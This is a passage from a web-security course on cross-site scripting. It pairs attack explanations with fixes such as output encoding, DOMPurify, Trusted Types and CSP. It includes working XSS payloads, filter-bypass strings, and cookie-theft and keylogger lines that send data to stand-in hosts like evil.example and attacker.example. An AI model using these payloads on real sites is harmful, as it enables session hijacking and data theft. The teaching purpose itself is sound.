**Theory**

**Cross-site scripting (XSS)** is, at root, a confusion between *data* and *code* inside the browser: the application takes input that should be inert text and the browser ends up treating it as executable script. When this happens, the attacker's JavaScript runs in the victim's browser *inside the victim's session on the vulnerable origin* — it can read the DOM, make authenticated requests, and act as the user. XSS is consistently among the most common and impactful web vulnerabilities precisely because it hijacks the trust the user and the site have in each other.

**Reflected XSS** is the simplest variant. The malicious input is included in a request — typically in a URL query parameter — and the server **reflects** it straight back into the immediate response without proper encoding. Because the payload lives in the request, it is not stored anywhere; the attack requires *delivering a crafted link* to the victim (via email, chat, a malicious ad) and getting them to click it. When they do, the server echoes the attacker's script into the page and the browser runs it. The classic example is a search page that prints "You searched for: `<your query>`" directly into the HTML.

The analogy is a mailroom that prints the sender's note onto the company letterhead without reading it: if the note says "and here is an official instruction," recipients may obey because it now carries the company's authority. Reflected XSS requires user interaction and is "one victim per link," which makes it slightly less severe than stored XSS, but it is still critical because it runs with the site's full origin privileges.

**Examples**

```text
Vulnerable flow:
  Victim clicks:  https://shop.example/search?q=<script>steal()</script>
  Server responds (unencoded reflection):
     <p>No results for <script>steal()</script></p>
  Browser parses the <script> as code and runs steal() in shop.example's origin.
```

```python
# VULNERABLE: the user's query is concatenated straight into HTML.
from flask import Flask, request
app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    return f"<p>No results for {q}</p>"   # reflected unencoded -> XSS

# FIXED: contextually escape before inserting into HTML.
from markupsafe import escape
@app.route('/search-safe')
def search_safe():
    q = request.args.get('q', '')
    return f"<p>No results for {escape(q)}</p>"   # <script> becomes &lt;script&gt;
```

**Key Takeaways**

- XSS is a data-as-code confusion: attacker input ends up executing as script in the victim's browser on the vulnerable origin.
- Reflected XSS echoes request input straight into the immediate response, so it needs a crafted link and a victim click.
- It is not stored, making it one-victim-per-link, but it still runs with the site's full origin authority.
- The fix is contextual output encoding so reflected input renders as inert text, never markup.

> 🧪 Practice
>
> 1. Identify the vulnerable line in a search handler that prints `q` into HTML and rewrite it to be safe.
> 2. Craft a proof-of-concept URL (using a harmless `alert`) for a reflected-XSS search parameter.
> 3. Explain why reflected XSS requires social engineering while stored XSS does not.
> 4. *Interview-style:* "Why is reflected XSS still rated critical even though it needs a victim to click a link?" *Hint: consider whose origin and session the injected script runs in once the click happens.*

#### Stored (Persistent) XSS

**Theory**

**Stored XSS** (also called persistent XSS) is the more dangerous sibling of reflected XSS. Here the malicious script is *saved* on the server — in a database, a comment, a profile field, a product review, a support ticket — and then served to *every* user who views that content. The attacker does not need to deliver a link or trick a specific victim; they inject once, and the payload fires automatically in the browser of everyone who loads the affected page. This makes stored XSS self-propagating in effect and capable of mass compromise, including the infamous social-network "XSS worms."

The elevated severity comes from two factors. First, **no interaction is needed from the victim** beyond normally using the site, so the attack reaches engaged, authenticated users. Second, the payload often lands in high-trust contexts — an admin reviewing user submissions, a moderator reading reports — so stored XSS frequently leads directly to privileged-account takeover. A payload placed in a field that only administrators see is a targeted path to the crown jewels.

The root cause is identical to reflected XSS — untrusted data rendered as markup — but the data makes a *round trip through storage* before being displayed, often to a different user than the one who submitted it. This is why encoding must happen reliably at **output time, in the context where the data is used**, not merely at input time: the same stored value might be rendered into HTML on one page, into a JavaScript string on another, and into an attribute on a third, each requiring different escaping.

**Examples**

```text
Stored XSS lifecycle:
  (1) Attacker posts a comment:   Nice post!<script>fetch('//evil/c?'+document.cookie)</script>
  (2) Server saves it to the DB verbatim.
  (3) Every visitor's browser loads the comment page...
  (4) ...and runs the attacker's script in THEIR session. No link, no click.
```

```javascript
// VULNERABLE: rendering a stored comment with innerHTML parses it as markup.
function render(comment) {
  document.getElementById('comments').innerHTML += comment.body;  // executes <script>
}

// FIXED: use textContent (or a sanitizer for rich text) so markup stays inert.
function renderSafe(comment) {
  const li = document.createElement('li');
  li.textContent = comment.body;             // <script> shown as literal text
  document.getElementById('comments').appendChild(li);
}
```

**Key Takeaways**

- Stored XSS persists the payload server-side and serves it to every viewer, needing no per-victim delivery.
- It can achieve mass compromise and self-propagating worms, and often targets high-privilege viewers like admins.
- The same stored value can be rendered into different contexts, so encoding must occur at output time per context.
- Prefer `textContent`/safe templating for untrusted data; use a vetted sanitizer only when rich HTML is genuinely required.

> 🧪 Practice
>
> 1. Describe the full lifecycle of a stored-XSS payload from submission to execution in another user's browser.
> 2. Explain why fixing XSS at input-validation time alone is insufficient and output encoding is essential.
> 3. Rewrite an `innerHTML`-based comment renderer to be safe for plain-text comments.
> 4. *Interview-style:* "Why is stored XSS generally rated more severe than reflected XSS?" *Hint: compare how many victims each reaches and whether any social engineering is required.*

#### DOM-Based XSS and Sinks

**Theory**

In reflected and stored XSS, the *server* places untrusted data into the HTML. In **DOM-based XSS**, the vulnerability is *entirely client-side*: the server's HTML is fine, but the page's own JavaScript reads attacker-controlled input from a **source** and writes it into a dangerous **sink** that interprets it as code or markup. The exploited string may never even reach the server — for instance, everything after `#` in a URL (the fragment) is not sent to the server, yet client script often reads it. This makes DOM XSS invisible to server-side filters and WAFs, which is why it is frequently missed.

The mental model is **sources and sinks**. A **source** is any input the attacker can influence: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data, or values read back from storage. A **sink** is an API that turns a string into live DOM or code: `element.innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `element.setAttribute('onclick', ...)`, assigning to `location`/`src` with a `javascript:` URL. A DOM-XSS bug exists whenever data flows from a source to a sink without sanitization. Finding them is a *data-flow* exercise, tracing tainted values through the JavaScript.

Because modern apps are heavily client-rendered (SPAs, frameworks), DOM XSS has grown in importance. The defense is the same principle applied client-side: never pass untrusted data to a dangerous sink. Use safe sinks (`textContent`, `setAttribute` for non-URL attributes), parse rather than interpret, apply a client-side sanitizer for HTML, and ideally enforce **Trusted Types** (covered later) so the browser refuses raw strings at dangerous sinks altogether.

**Examples**

```javascript
// VULNERABLE DOM XSS: source (location.hash) flows to a sink (innerHTML).
// URL: https://app.example/page#<img src=x onerror=alert(document.cookie)>
const section = location.hash.slice(1);         // SOURCE: attacker controls the fragment
document.getElementById('out').innerHTML = section;  // SINK: parses & runs the payload
// The fragment is never sent to the server, so server-side filtering can't see it.

// FIXED: write to a safe sink; the string is treated as inert text.
document.getElementById('out').textContent = decodeURIComponent(section);
```

| Common sources | Common sinks |
|----------------|--------------|
| `location.hash` / `.search` | `innerHTML` / `outerHTML` |
| `document.referrer` | `document.write()` |
| `window.name` | `eval()` / `Function()` |
| `postMessage` event data | `setTimeout`/`setInterval` (string arg) |
| values read from `localStorage` | `location` / `src` = `javascript:` URL |

**Key Takeaways**

- DOM-based XSS is purely client-side: page JavaScript moves attacker input from a source into a dangerous sink.
- Fragment-based payloads (`location.hash`) never reach the server, so server-side filters and WAFs miss them.
- Finding DOM XSS is a data-flow task: trace tainted sources to code-executing sinks.
- Defend by using safe sinks (`textContent`), client-side sanitizers for HTML, and Trusted Types to block raw strings at sinks.

> 🧪 Practice
>
> 1. Identify the source and the sink in a snippet that assigns `location.hash` to `innerHTML`, and rewrite it safely.
> 2. List three sources and three sinks and explain why each sink is dangerous.
> 3. Explain why a server-side WAF cannot detect a fragment-based DOM-XSS payload.
> 4. *Interview-style:* "An app has no server-side reflection yet is vulnerable to XSS. How?" *Hint: think about input the client reads directly and writes into the DOM without the server ever seeing it.*

#### Mutation XSS and Parser Differentials

**Theory**

Sanitizers try to clean untrusted HTML by parsing it, removing dangerous elements and attributes, and emitting "safe" markup. **Mutation XSS (mXSS)** exploits the gap between *how the sanitizer parsed the string* and *how the browser re-parses the sanitized output once it is placed in the DOM*. If the browser mutates the markup during insertion — fixing up malformed tags, re-interpreting content inside certain elements — a string that looked safe to the sanitizer can "mutate" back into something executable. The sanitizer and the live DOM disagree about what the bytes mean, and the attacker lives in that disagreement.

This is one case of a broader class: **parser differentials**, where two parsers that are supposed to agree actually handle edge cases differently. Browsers have famously lenient, quirk-laden HTML parsers with special "foreign content" rules for `<svg>`, `<math>`, template elements, and encoding edge cases. A sanitizer written against one mental model of parsing, or a slightly different parser, can be tricked by inputs that round-trip differently through `innerHTML`. Historic mXSS payloads used things like nested `<svg>`/`<style>` contexts or `<noscript>` to make the browser re-interpret attributes as tags.

The practical lessons are twofold. First, do not write your own HTML sanitizer — use a well-maintained library (like DOMPurify) that is specifically hardened against known mutation vectors and updated as new ones are found. Second, prefer designs that avoid the problem entirely: render untrusted data as text, use templating that escapes by default, and layer CSP and Trusted Types so that even a sanitizer bypass has a reduced blast radius. mXSS is a reminder that "I sanitized it" is not the same as "the browser will treat it as safe."

**Examples**

```text
Mutation idea (conceptual): sanitizer sees inert markup, the DOM re-parses it as active.

  Input given to sanitizer:   <svg><style>&lt;img src=x onerror=alert(1)&gt;</style></svg>
  Sanitizer: "that's just text inside <style>, harmless" -> passes it through
  Browser, on insertion, re-parses the context and the encoded chars become a live
  <img ... onerror=...> that executes. Same bytes, two different parse results.
```

```javascript
// Defense: use a maintained, mutation-aware sanitizer rather than hand-rolling one.
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(untrustedHtml);   // hardened against known mXSS vectors
document.getElementById('bio').innerHTML = clean;   // safer, but still layer CSP/TT
```

**Key Takeaways**

- Mutation XSS exploits the difference between how a sanitizer parses markup and how the browser re-parses it on insertion.
- It is a form of parser differential, abusing lenient/quirky HTML parsing (SVG/MathML/foreign content, encoding edge cases).
- Never hand-roll an HTML sanitizer; use a maintained, mutation-aware library and keep it updated.
- Reduce blast radius with text rendering, escape-by-default templating, CSP, and Trusted Types rather than trusting sanitization alone.

> 🧪 Practice
>
> 1. In your own words, explain what "the sanitizer and the browser disagree" means in the context of mXSS.
> 2. Explain why foreign-content elements like `<svg>` and `<math>` are frequent sources of parser differentials.
> 3. Argue why "we wrote a regex-based HTML sanitizer" is a red flag in a code review.
> 4. *Interview-style:* "If you sanitize HTML with a trusted library, why still deploy CSP?" *Hint: defense in depth — what happens on the day a new sanitizer bypass is published?*

#### Payload Construction and Context Escaping

**Theory**

Delivering XSS is rarely as simple as dropping in `<script>alert(1)</script>`; the payload must be valid for the exact **context** where the input lands. The same injected string behaves completely differently depending on whether it appears in HTML text, inside an HTML attribute, within a `<script>` block, in a URL attribute like `href`, or inside a CSS value. Writing a working payload is the art of *breaking out of the current context* and *into* an executable one, using the delimiters that context respects.

Consider the main contexts. In **HTML text** context, you can introduce a new tag directly (`<img src=x onerror=...>`). In an **attribute value** context, you must first close the attribute's quote and the tag: if your input lands in `value="HERE"`, a payload like `"><img src=x onerror=alert(1)>` escapes the quote, closes the input tag, and starts a new one. In a **JavaScript string** context (your input is inside `var x = 'HERE'`), you break out with a quote and a statement terminator: `';alert(1);//`. In a **URL** context (`href="HERE"`), a `javascript:alert(1)` URL may execute on click. Each context has its own escape sequence, which is why reconnaissance — figuring out exactly where and how input is reflected — precedes payload writing.

This is also why the *defense* must be contextual (next topics): HTML-encoding stops payloads in HTML contexts but does nothing for a `javascript:` URL or a value already inside a script block. The attacker thinks in terms of "what delimiter ends this context," and the defender must encode precisely the characters that are special *in that context*. Understanding context escaping from the attacker's side is what makes the defensive principle of contextual output encoding click.

**Examples**

```text
Same input location, different escapes required:

Context: HTML text        <div>INPUT</div>
  payload: <img src=x onerror=alert(1)>

Context: attribute value  <input value="INPUT">
  payload: "><svg onload=alert(1)>          # close quote + tag, open new element

Context: JS string        <script>let s='INPUT';</script>
  payload: ';alert(1);//                    # close string, run code, comment out rest

Context: URL attribute    <a href="INPUT">x</a>
  payload: javascript:alert(1)              # executes when the link is activated
```

```javascript
// Demonstration of why context matters: HTML-encoding does NOT neutralize a JS-string break.
// If the server HTML-encodes quotes but input is inside a <script> string, &#39; is decoded
// differently and the break can still succeed depending on handling — always encode for the
// ACTUAL context (JS string escaping here, not HTML entity escaping).
```

**Key Takeaways**

- A working XSS payload must escape the specific context (HTML text, attribute, JS string, URL, CSS) where input appears.
- Attackers break out using that context's delimiters: `>` and new tags in HTML, `"`/`'` to close attributes or strings, `javascript:` in URLs.
- The right payload depends entirely on *where* and *how* the input is reflected, so recon precedes exploitation.
- Because escaping is context-specific, defenses must encode for the exact output context, not apply one generic filter.

> 🧪 Practice
>
> 1. Given input reflected inside `value="..."`, write the payload that breaks out and executes script.
> 2. Write the break-out payload for input placed inside a single-quoted JavaScript string.
> 3. Explain why a `javascript:` URL is dangerous in an `href` and which encoding (not HTML entity encoding) neutralizes it.
> 4. *Interview-style:* "Why can the same user input be safe in one place on a page and exploitable in another?" *Hint: the surrounding syntactic context determines which characters are special and what counts as 'breaking out.'*

#### Filter and Sanitizer Bypass Techniques

**Theory**

Many applications try to stop XSS with **blocklist filters** — stripping the word `script`, removing `on*` event attributes, or deleting angle brackets. Blocklists are a losing strategy because the space of ways to introduce script is enormous and the HTML/JS parsers are permissive. Understanding common bypasses is important for both attackers (to test defenses) and defenders (to understand why blocklists fail and allowlists/encoding win).

Typical bypass families: **case and whitespace variation** (`<ScRiPt>`, `<img/src=x/onerror=...>`), **alternative tags and events** that a filter forgot (`<svg onload>`, `<body onpageshow>`, `<details ontoggle>`), **encoding tricks** (HTML entities, URL encoding, overlong/odd encodings that the browser decodes but the filter didn't), **broken markup the browser repairs** (a missing quote or bracket that the lenient parser fixes into a working tag), and **no-letters/obfuscated JavaScript** that reconstructs code from allowed characters. If a filter naively removes the literal string `script`, an attacker may write `<scrscriptipt>` so that removing the inner `script` leaves a working `<script>` — a classic "replace-once" flaw.

The takeaway is not a bag of tricks to memorize but a principle: **you cannot enumerate all bad input, so stop trying to.** The correct defenses invert the problem — contextual output *encoding* (treat everything as data), *allowlist* sanitization via a hardened library (keep only known-safe elements/attributes), and structural controls (CSP, Trusted Types). Filters may still have a role for UX or as a thin extra layer, but they must never be the primary defense, and "we filtered out `<script>`" should be treated as not fixed.

**Examples**

```text
Why blocklists fail — a few representative bypass shapes:

  Case:          <ScRiPt>alert(1)</ScRiPt>
  Alt event:     <svg onload=alert(1)>
  Alt tag:       <details open ontoggle=alert(1)>
  Replace-once:  <scr<script>ipt>  -> filter removes inner "script" -> <script>
  Encoding:      <img src=x onerror=&#97;lert(1)>   (entity-encoded 'a')
  Malformed:     <img src=x onerror=alert(1)//      (browser repairs it)
```

```javascript
// Anti-pattern: a replace-once blocklist that an attacker trivially defeats.
function badSanitize(s) {
  return s.replace(/<script>/gi, '');   // removing once leaves "<scr<script>ipt>" -> "<script>"
}
// Correct approach: encode on output, or use an allowlist sanitizer (DOMPurify).
```

**Key Takeaways**

- Blocklist filters fail because the ways to introduce script (case, alt tags/events, encodings, malformed markup) are effectively unbounded.
- "Replace-once" and single-pass removals are especially fragile and are easily bypassed by nesting.
- The browser's lenient parser repairs broken markup, turning filter-mangled input back into working payloads.
- Replace blocklists with contextual encoding, allowlist-based hardened sanitizers, and structural controls like CSP/Trusted Types.

> 🧪 Practice
>
> 1. Show how a filter that removes the literal `<script>` once can be bypassed, and explain the mechanism.
> 2. Give three payloads that avoid the word `script` entirely yet execute JavaScript.
> 3. Explain why allowlisting safe elements is more robust than blocklisting dangerous ones.
> 4. *Interview-style:* "A developer says they 'strip all `<script>` tags,' so XSS is impossible. Convince them otherwise." *Hint: event-handler attributes and non-script tags execute JavaScript with no `<script>` in sight.*

#### Session Theft and Keylogging via XSS

**Theory**

XSS is dangerous because of what the attacker's script can *do* once it runs with the victim's origin privileges. The classic impact is **session theft**: if the session cookie lacks `HttpOnly`, the payload reads `document.cookie` and sends it to an attacker server, who then replays it to impersonate the victim. But cookie theft is only the most obvious capability; modern XSS impact is far broader and does not depend on reading cookies at all.

Because the script runs *as the user on the site*, it can simply **act as the user directly**: make authenticated `fetch`/XHR requests to any same-origin endpoint, change the account email, add an API key, transfer funds, or escalate privileges — all riding on the browser's ambient credentials. This is why `HttpOnly` alone does not neutralize XSS: even if the token is unreadable, the script can still perform actions with it. XSS can also plant a **keylogger** by adding event listeners that capture every keystroke (including passwords typed on the page), scrape the DOM for displayed PII, read autofilled form values, capture clipboard contents, or phish by injecting a fake login prompt into the trusted page.

A further escalation is **persistence and propagation**: a stored-XSS payload can rewrite the page, hook navigation, and re-inject itself, and on social platforms spread to other users as a worm. The security conclusion is that XSS should be treated as *arbitrary action as the victim on the vulnerable origin*, which is close to full account takeover. This framing — not just "they can steal a cookie" — is what justifies the high severity and the layered defenses in the following topics.

**Examples**

```javascript
// 1) Cookie theft (works only if the session cookie lacks HttpOnly):
new Image().src = 'https://evil.example/c?' + encodeURIComponent(document.cookie);

// 2) Act as the user — no cookie reading needed; the browser attaches credentials:
fetch('/account/email', {
  method: 'POST',
  credentials: 'include',                 // ambient session cookie rides along
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email: 'attacker@evil.example' })  // hijack the account
});

// 3) Keylogger: capture every keystroke on the page and exfiltrate it.
document.addEventListener('keydown', e =>
  navigator.sendBeacon('https://evil.example/k', e.key));
```

**Key Takeaways**

- XSS runs with the victim's origin privileges, so impact is far broader than cookie theft.
- With `HttpOnly` set, the token can't be read, but the script can still perform authenticated actions as the user.
- Payloads can keylog, scrape DOM/PII, read autofill/clipboard, phish within the trusted page, and (when stored) self-propagate.
- Treat any XSS as potential account takeover, which is why layered defenses are required rather than cookie flags alone.

> 🧪 Practice
>
> 1. Write a one-line payload that exfiltrates a non-`HttpOnly` cookie, and explain the `HttpOnly` mitigation.
> 2. Explain how an attacker can change the victim's account email via XSS even when the cookie is `HttpOnly`.
> 3. Describe how an XSS keylogger is implemented using DOM event listeners.
> 4. *Interview-style:* "Does setting `HttpOnly` make XSS low severity? Why or why not?" *Hint: separate stopping cookie reading from stopping actions performed with the ambient session.*

#### Browser Exploitation Frameworks

**Theory**

Once an attacker has XSS on a page, they have a foothold in the victim's browser — and tooling exists to industrialize what comes next. **Browser exploitation frameworks**, the best-known being **BeEF (Browser Exploitation Framework)**, turn an XSS "hook" into a managed command-and-control channel over the browser. The attacker's XSS payload loads a small **hook script** that repeatedly polls the attacker's server for commands; each hooked browser becomes a controllable node, and the operator drives it from a console.

Conceptually, the hook gives the attacker a remote-control handle on the victim's browsing session for as long as the page stays open. From there, framework "modules" automate common post-XSS actions: fingerprinting the browser and plugins, stealing cookies and stored data, taking screenshots of the page, launching **phishing overlays** (a fake login box on the real site), pivoting with social-engineering prompts (fake "update your plugin" dialogs), scanning the victim's internal network via their browser, and chaining to actual browser or network exploits. The value to an attacker is orchestration: managing many hooked browsers and launching tested modules rather than hand-writing each payload.

For a defender or student, the point is to internalize the *scope* of post-exploitation: XSS is not an endpoint but a beachhead that mature tooling can expand into reconnaissance of the internal network, persistent control of the session, and credential phishing on a trusted origin. This reinforces that preventing XSS in the first place (and constraining it with CSP) is far more valuable than hoping its impact stays small. Using such frameworks is legitimate only in authorized testing (pentests, labs, CTFs) with explicit permission.

**Examples**

```text
XSS-to-C2 with a hook framework (conceptual):

  XSS payload: <script src="https://attacker.example/hook.js"></script>
                     │
                     ▼
  hook.js polls attacker console every few seconds  ──▶  [ Operator Console ]
                     │                                     - fingerprint browser
                     ▼                                     - screenshot page
  victim browser executes pushed "modules":              - phishing overlay
     cookie grab · keylog · fake login · intranet scan   - internal network scan
```

```text
Ethical/legal note:
  Hooking a browser you do not own and are not authorized to test is illegal.
  Use BeEF-style tooling only in labs, CTFs, or engagements with written scope.
```

**Key Takeaways**

- Browser exploitation frameworks (e.g., BeEF) convert an XSS foothold into a managed command-and-control channel via a polling hook script.
- Each hooked browser becomes a remote-controllable node offering fingerprinting, data theft, phishing overlays, and internal network scanning.
- They demonstrate that XSS is a beachhead for extensive post-exploitation, not a minor bug.
- Such tooling is for authorized testing only; prevention and CSP matter more than hoping impact stays limited.

> 🧪 Practice
>
> 1. Explain, at a high level, how an XSS hook script maintains an ongoing control channel to the attacker.
> 2. List four post-exploitation actions a browser framework can automate after a successful hook.
> 3. Describe how a strict CSP would interfere with loading an external hook script.
> 4. *Interview-style:* "Why is 'it's just an alert box' a poor way to dismiss an XSS finding?" *Hint: an alert merely proves code execution; think about what frameworks do with that same execution.*

#### Contextual Output Encoding as Defence

**Theory**

The single most reliable defense against XSS is **contextual output encoding** (also called output escaping): at the moment untrusted data is written into a page, transform it so the browser treats it as inert *data* rather than *code*, using the encoding appropriate to the exact context. This directly attacks the root cause — the data/code confusion — by ensuring the characters that would let data "break out" of its context are rendered harmless. Done correctly and consistently, it prevents XSS regardless of what the input contains.

The word "contextual" is the crux. There is no single universal escape; each output context has its own special characters and its own encoding. In **HTML text/element** context, encode `< > & " '` to HTML entities (`&lt;` etc.). In an **HTML attribute** context, encode so the value cannot close its quote. In a **JavaScript** context, use JavaScript string escaping (and prefer putting data in `textContent` or a `data-` attribute over inlining it into script). In a **URL** context, URL-encode and validate the scheme to block `javascript:`. In a **CSS** context, use CSS escaping. Applying HTML encoding to data that lands in a JavaScript or URL context does not protect it — using the wrong encoder is a common cause of "but we escaped it" bugs.

In practice you should lean on frameworks that **escape by default**: modern template engines (React's JSX, Angular, Jinja2 with autoescape, Go's `html/template`) automatically apply context-aware encoding, so the secure path is the default path and developers only get into trouble when they bypass it (e.g., `dangerouslySetInnerHTML`, `|safe`, `v-html`). The guidance: emit untrusted data only through these escaping mechanisms, pick the encoder that matches the real output context, and treat any raw-HTML insertion API as a reviewed exception, not a convenience.

**Examples**

```text
One value, four contexts, four correct encodings:

  HTML text       <div>DATA</div>              -> HTML entity encode  (&lt; &gt; &amp; ...)
  HTML attribute  <input value="DATA">          -> attribute encode (quote-safe)
  JS string       <script>let x="DATA";</script> -> JS string escape  (\x22, \n, ...)
  URL in href     <a href="DATA">                -> URL-encode + scheme allowlist (no javascript:)
```

```python
# Jinja2 autoescaping chooses HTML encoding for this context automatically:
#   template:  <p>Hello {{ name }}</p>
#   name = "<script>alert(1)</script>"  ->  renders  &lt;script&gt;alert(1)&lt;/script&gt;

# Go's html/template is context-aware and escapes per position automatically:
#   t := template.Must(template.New("x").Parse(`<a href="{{.}}">link</a>`))
#   t.Execute(w, userInput)   // encodes correctly for the URL-attribute context
```

**Key Takeaways**

- Contextual output encoding neutralizes XSS at its root by rendering untrusted data as inert text in its specific context.
- There is no universal escape: HTML, attribute, JavaScript, URL, and CSS contexts each need their own encoder.
- Using the wrong encoder (e.g., HTML-encoding data that lands in a script or URL) leaves the bug exploitable.
- Prefer frameworks/templates that escape by default and treat raw-HTML insertion APIs as reviewed exceptions.

> 🧪 Practice
>
> 1. For a value placed inside `href="..."`, state the correct encoding and the extra check needed beyond encoding.
> 2. Explain why HTML entity encoding does not protect data inserted into a `<script>` block.
> 3. Name three template engines that autoescape and the specific feature that disables that protection in each.
> 4. *Interview-style:* "What does 'contextual' add to 'output encoding,' and why does it matter?" *Hint: the same character is dangerous in some contexts and harmless in others, so the encoder must match the destination.*

#### Sanitization Libraries and Trusted Types

**Theory**

Output encoding works when untrusted data should be displayed as text. But some features *require rendering user-supplied HTML* — a rich-text comment, a WYSIWYG editor, a Markdown preview. You cannot encode this (that would show the tags as text) and you cannot trust it (it may contain script), so you must **sanitize**: parse the HTML and keep only an allowlist of safe elements and attributes, dropping scripts, event handlers, and dangerous URLs. The essential rule is to use a **well-maintained, actively hardened sanitizer** — **DOMPurify** is the de facto standard — rather than writing your own, because handling the browser's parser quirks and mutation vectors correctly is extremely hard (see mXSS).

Even a perfect sanitizer leaves a gap: developers still have to *remember* to call it at every dangerous sink, and a single missed `element.innerHTML = userData` reintroduces XSS. **Trusted Types** closes this gap at the browser level. When enabled via CSP (`Content-Security-Policy: require-trusted-types-for 'script'`), the browser *refuses* to accept a plain string at dangerous DOM sinks like `innerHTML` and `script.src`; the value must be a special `TrustedHTML`/`TrustedScript` object produced by a named, audited **policy**. This flips the default from "unsafe unless you remember to sanitize" to "impossible unless you route through an approved policy," so the only place untrusted data can reach a sink is code you have explicitly reviewed.

Together these form the modern client-side XSS defense stack for rich content: a hardened sanitizer does the actual cleaning, and Trusted Types enforces that *all* data flowing to dangerous sinks passes through a controlled, auditable chokepoint. Trusted Types also dramatically shrinks the search space for DOM-XSS review — instead of auditing every sink in a large codebase, you audit the handful of policies. Browser support is good in Chromium-based browsers and is applied as defense in depth alongside CSP.

**Examples**

```javascript
// Sanitize before inserting user-supplied rich HTML (rich text, Markdown preview):
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(userHtml, { ALLOWED_TAGS: ['b','i','a','p','ul','li'] });
el.innerHTML = safe;   // only allowlisted, cleaned markup survives

// Trusted Types: the browser blocks raw strings at sinks; data MUST pass a named policy.
// CSP header:  Content-Security-Policy: require-trusted-types-for 'script'
const policy = trustedTypes.createPolicy('sanitize-html', {
  createHTML: (input) => DOMPurify.sanitize(input)   // the one audited chokepoint
});
el.innerHTML = policy.createHTML(userHtml);   // OK: a TrustedHTML object
// el.innerHTML = userHtml;                    // THROWS: plain string rejected by the browser
```

**Key Takeaways**

- When you must render user HTML, sanitize with a maintained allowlist-based library (DOMPurify); never hand-roll one.
- Sanitization still relies on developers remembering to call it at every sink — one miss reintroduces XSS.
- Trusted Types makes the browser reject plain strings at dangerous sinks, forcing data through audited policies.
- Together they turn DOM-XSS review from auditing every sink into auditing a few policies, as defense in depth with CSP.

> 🧪 Practice
>
> 1. Use DOMPurify to allow only a small set of formatting tags for a comment field and explain what gets stripped.
> 2. Write the CSP directive that enables Trusted Types and describe what the browser then forbids.
> 3. Explain how Trusted Types reduces the effort of auditing a large codebase for DOM XSS.
> 4. *Interview-style:* "Why is 'we call DOMPurify' not quite enough on its own?" *Hint: think about the one sink a developer forgets to route through it, and what enforces coverage.*

#### CSP as XSS Mitigation and Its Bypasses

**Theory**

Content Security Policy is the primary *mitigation* layer for XSS: even when an injection succeeds, a well-built CSP can stop the injected script from executing or from exfiltrating data, downgrading a critical bug to a near-miss. CSP is explicitly a **second line of defense** — it does not fix the injection, it contains it — and the modern consensus is that a strong CSP meaningfully reduces XSS impact across a large application where guaranteeing perfect encoding everywhere is unrealistic.

The effective pattern, as covered in 9.1, is a **nonce-based, `'strict-dynamic'`** policy: inline scripts run only if they carry a per-response random nonce the attacker cannot predict, and trusted scripts may load their own dependencies while arbitrary injected `<script src>` and inline handlers are blocked. This is far stronger than host-allowlist CSPs, which were the earlier style and proved weak in practice. Pairing CSP with Trusted Types (`require-trusted-types-for 'script'`) extends containment to DOM-based XSS by blocking raw strings at sinks.

But CSP is a mitigation, not a guarantee, and it has well-known **bypasses** you must design against. An allowlisted host that serves a **JSONP** endpoint or an unsafe library lets an attacker load executable code "from an allowed source." **Script gadgets** — legitimate code already on the page that transforms data attributes or DOM content into script — can be triggered by injected markup even under CSP. `'unsafe-eval'` reopens `eval`-based execution. Base-tag injection, dangling-markup data exfiltration, and overly broad `connect-src` can leak data despite script restrictions. The lessons: build a nonce/`strict-dynamic` policy rather than host allowlists, set `object-src 'none'` and `base-uri 'none'`, keep the allowlist tiny and JSONP-free, and never treat CSP as a substitute for fixing the underlying XSS.

**Examples**

